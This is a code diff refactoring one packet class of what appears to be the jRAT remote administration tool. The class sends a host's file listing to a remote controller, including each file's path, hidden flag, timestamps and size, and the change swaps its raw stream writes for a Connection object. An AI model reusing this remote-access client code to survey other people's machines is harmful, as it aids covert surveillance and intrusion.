@@ -1,8 +1,8 @@
 package jrat.module.fs.packets;
 
+import jrat.client.Connection;
 import jrat.client.packets.outgoing.AbstractOutgoingPacket;
-import jrat.common.io.StringWriter;
-import java.io.DataOutputStream;
+
 import java.io.File;
 import java.util.Calendar;
 import java.util.Date;
@@ -17,22 +17,22 @@ public class Packet22ListFiles extends AbstractOutgoingPacket {
 	}
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		dos.writeInt(files == null ? 0 : files.length);
+	public void write(Connection con) throws Exception {
+		con.writeInt(files == null ? 0 : files.length);
 
 		for (int i = 0; i < (files == null ? 0 : files.length); i++) {
 			File file = files[i];
-			
-			sw.writeLine(file.getAbsolutePath());
+
+            con.writeLine(file.getAbsolutePath());
 
 			if (file.isDirectory()) {
-				dos.writeBoolean(true);
-				dos.writeBoolean(file.isHidden());
+				con.writeBoolean(true);
+				con.writeBoolean(file.isHidden());
 			} else {
-				dos.writeBoolean(false);
-				dos.writeBoolean(file.isHidden());
-				dos.writeLong(file.lastModified());
-				dos.writeLong(file.length());
+				con.writeBoolean(false);
+				con.writeBoolean(file.isHidden());
+				con.writeLong(file.lastModified());
+				con.writeLong(file.length());
 			}
 		}
 
